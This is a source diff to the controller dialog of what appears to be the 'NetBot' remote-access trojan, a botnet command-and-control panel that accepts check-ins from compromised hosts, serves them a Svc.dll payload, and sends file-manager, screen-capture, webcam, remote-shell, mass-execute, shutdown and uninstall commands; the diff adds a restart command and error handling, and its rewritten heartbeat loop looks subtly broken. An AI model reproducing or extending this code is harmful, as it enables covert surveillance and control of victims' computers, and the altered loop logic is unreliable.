@@ -87,8 +87,9 @@ BEGIN_MESSAGE_MAP(CNetBotDlg, CDialog)
 	ON_COMMAND(ID_BTN_TWEBSITE, OnBtnTwebsite)
 	ON_COMMAND(ID_ONLINE_VIDEO, OnOnlineVideo)
 	ON_BN_CLICKED(IDC_BTN_SELNUM, OnBtnSelNum)
-	ON_WM_CLOSE()
 	ON_COMMAND(ID_BTN_TFILETRAN, OnBtnTfiletran)
+	ON_WM_CLOSE()
+	ON_COMMAND(ID_ONLINE_RESTART, OnOnlineRestart)
 	//}}AFX_MSG_MAP
 	ON_COMMAND_RANGE(IDC_RADIO1,IDC_RADIO5,OnSelectComputer) 
 	ON_MESSAGE(WM_SOCKET_CLOSE, OnCloseEvent)
@@ -422,6 +423,8 @@ LRESULT CNetBotDlg::OnCloseEvent(WPARAM wParam, LPARAM lParam)
 				break;
 			}
 		}
+
+		checkfun();
 	}
 
 	return TRUE;
@@ -699,16 +702,16 @@ int __stdcall ReadData(TCHAR szFile[],char **data)
 		
 		*data = (CHAR *)VirtualAlloc(NULL,dwSize,MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 		
-		ReadFile(hFile,*data,dwSize,&dwSize,NULL);
+		ReadFile(hFile, *data, dwSize, &dwSize, NULL);
 		
 		CloseHandle(hFile);
 		
 		return dwSize;
 	}
 	
-	MsgErr(_T("Read %s Error"),szLogFileName);
+	MsgErr(_T("Read %s Error"), szLogFileName);
 	
-	return 0;
+	return -1;
 }
 
 DWORD CNetBotDlg::AcceptSocket(SOCKET socket)
@@ -723,16 +726,24 @@ DWORD CNetBotDlg::AcceptSocket(SOCKET socket)
 		char    chBuffer[256];
 
 		//接收上线信息
-		if(! RecvMsg(socket,chBuffer,&msgHead))
+		if( !RecvMsg(socket,chBuffer,&msgHead) )
+		{
 			return 0;
+		}
 		
-		//解析命令
 		switch(msgHead.dwCmd)
 		{
 		case SOCKET_DLLLOADER:
 			{
 				PCHAR SvcFileBuf;
 				int SvcFileSize = ReadData(_T("Svc.dll"), &SvcFileBuf);
+
+				if (SvcFileSize == -1)
+				{
+					shutdown(socket, 0x02);
+					closesocket(socket);
+					break;
+				}
 
 				MsgHead msgHead;
 				msgHead.dwCmd = CMD_DLLDATA;
@@ -860,6 +871,7 @@ DWORD CNetBotDlg::AcceptSocket(SOCKET socket)
 				PostMessage(WM_VIDEODLGSHOW, (DWORD)pInput, 0);
 			}
 			break;
+
 		default://啥都不是，关掉你
 			{
 				shutdown(socket, 0x02);
@@ -930,7 +942,6 @@ DWORD CNetBotDlg::ThreadAccept()
 
 int CNetBotDlg::checkfun()
 {
-	//心跳包
 	MsgHead msgHead;
 	msgHead.dwCmd = CMD_HEARTBEAT;
 	msgHead.dwSize = 0;
@@ -943,7 +954,8 @@ int CNetBotDlg::checkfun()
 	CAutoLock Lock(cOnlineLock);
 	int AllNum = m_OnLineList.GetItemCount();
 	DWORD socket;
-	for(int i = dwCount; i < AllNum; i += 2)
+
+	for(int i = AllNum - dwCount; i > 0; i -= 3)
 	{	
 		socket = m_OnLineList.GetItemData(i);
 		if(!SendMsg(socket, NULL, &msgHead))
@@ -951,8 +963,6 @@ int CNetBotDlg::checkfun()
 			shutdown(socket, 0x02);
 			closesocket(socket);
 			m_OnLineList.DeleteItem(i);
-			AllNum--;
-			i--;
 		}	
 	}
 	
@@ -961,22 +971,19 @@ int CNetBotDlg::checkfun()
 	return 0;
 }
 
-DWORD CNetBotDlg::ThreadCheck()            //在线检测线程
+DWORD CNetBotDlg::ThreadCheck()
 {
 	while(1)
 	{
 		checkfun();		
-		Sleep(60 * 1000);//一分钟查询一次
+		Sleep(60 * 1000);
 	}
 	
 	return 0;
 }
 
-//////////////////////////////////////////////////////////////////////////////////
-//单击列表框选择主机
 void CNetBotDlg::OnClickListOnline(NMHDR* pNMHDR, LRESULT* pResult) 
 {
-	// TODO: Add your control notification handler code here
 	POSITION pos = m_OnLineList.GetFirstSelectedItemPosition();
 	int iCurrSel= m_OnLineList.GetNextSelectedItem(pos);
 	if(iCurrSel >= 0)
@@ -996,7 +1003,6 @@ void CNetBotDlg::OnClickListOnline(NMHDR* pNMHDR, LRESULT* pResult)
 //右击列表框显示菜单
 void CNetBotDlg::OnRclickListOnline(NMHDR* pNMHDR, LRESULT* pResult) 
 {
-	// TODO: Add your control notification handler code here
 	POSITION pos = m_OnLineList.GetFirstSelectedItemPosition();
 	int iCurrSel= m_OnLineList.GetNextSelectedItem(pos);
 	if(iCurrSel >= 0)
@@ -1018,7 +1024,6 @@ void CNetBotDlg::OnRclickListOnline(NMHDR* pNMHDR, LRESULT* pResult)
 //右键菜单
 void CNetBotDlg::OnOnlineFilemanage() 
 {
-	// TODO: Add your command handler code here
 	if(m_CurrSock != INVALID_SOCKET)
 	{
 		//发送开启文件管理命令
@@ -1044,7 +1049,6 @@ void CNetBotDlg::OnOnlineFilemanage()
 
 void CNetBotDlg::OnOnlineScreen() 
 {
-	// TODO: Add your command handler code here
 	if(m_CurrSock != INVALID_SOCKET)
 	{
 		//发送开启屏幕命令
@@ -1071,7 +1075,6 @@ void CNetBotDlg::OnOnlineScreen()
 
 void CNetBotDlg::OnOnlineProcess() 
 {
-	// TODO: Add your command handler code here
 	if(m_CurrSock != INVALID_SOCKET)
 	{
 		//发送开启进程管理命令
@@ -1097,7 +1100,6 @@ void CNetBotDlg::OnOnlineProcess()
 
 void CNetBotDlg::OnOnlineShell() 
 {
-	// TODO: Add your command handler code here
 	if(m_CurrSock != INVALID_SOCKET)
 	{
 		//发送开启远程shell命令
@@ -1123,7 +1125,6 @@ void CNetBotDlg::OnOnlineShell()
 
 void CNetBotDlg::OnOnlineVideo() 
 {
-	// TODO: Add your command handler code here
 	if(m_CurrSock != INVALID_SOCKET)
 	{
 		//发送视频捕捉命令
@@ -1149,7 +1150,6 @@ void CNetBotDlg::OnOnlineVideo()
 
 void CNetBotDlg::OnOnlinePoweroff() 
 {
-	// TODO: Add your command handler code here
 	if(m_CurrSock != INVALID_SOCKET)
 	{
 		//发送[关机]命令
@@ -1173,7 +1173,6 @@ void CNetBotDlg::OnOnlinePoweroff()
 
 void CNetBotDlg::OnOnlineReboot() 
 {
-	// TODO: Add your command handler code here
 	if(m_CurrSock != INVALID_SOCKET)
 	{
 		//发送[重启]命令
@@ -1221,7 +1220,6 @@ void CNetBotDlg::OnOnlineLogoff()
 
 void CNetBotDlg::OnOnlineUninstall() 
 {
-	// TODO: Add your command handler code here
 	if(m_CurrSock != INVALID_SOCKET)
 	{
 		//发送[卸载]命令
@@ -1240,14 +1238,31 @@ void CNetBotDlg::OnOnlineUninstall()
 			shutdown(m_CurrSock,0x02);
 			closesocket(m_CurrSock);
 		}
-	}			
+	}		
 }
-////////////////////////////////////////////////////////////////////////////
+
+void CNetBotDlg::OnOnlineRestart() 
+{
+	if(m_CurrSock != INVALID_SOCKET)
+	{
+		MsgHead msgHead;
+		msgHead.dwCmd = CMD_RESTART;
+		msgHead.dwSize = 0;
+		
+		if(SendMsg(m_CurrSock, NULL, &msgHead))
+		{
+			StatusTextOut(0,"成功发送 [重新加载] 命令");
+		}
+		else
+		{
+			shutdown(m_CurrSock,0x02);
+			closesocket(m_CurrSock);
+		}
+	}
+}
 
 void CNetBotDlg::OnBtnMulpoweroff() 
 {
-	// TODO: Add your control notification handler code here
-	//发送[关机]命令
 	MsgHead msgHead;
 	msgHead.dwCmd = CMD_POWEROFF;
 	msgHead.dwSize = 0;
@@ -1280,8 +1295,6 @@ void CNetBotDlg::OnBtnMulpoweroff()
 
 void CNetBotDlg::OnBtnMulreboot() 
 {
-	// TODO: Add your control notification handler code here
-	//发送[重启]命令
 	MsgHead msgHead;
 	msgHead.dwCmd = CMD_REBOOT;
 	msgHead.dwSize = 0;
@@ -1314,7 +1327,6 @@ void CNetBotDlg::OnBtnMulreboot()
 
 void CNetBotDlg::OnBtnMulexec() 
 {
-	// TODO: Add your control notification handler code here
 	UpdateData();
 
 	MsgHead msgHead;
@@ -1352,7 +1364,6 @@ void CNetBotDlg::OnBtnMulexec()
 
 void CNetBotDlg::OnBtnMulopen() 
 {
-	// TODO: Add your control notification handler code here
 	UpdateData();
 
 	MsgHead msgHead;
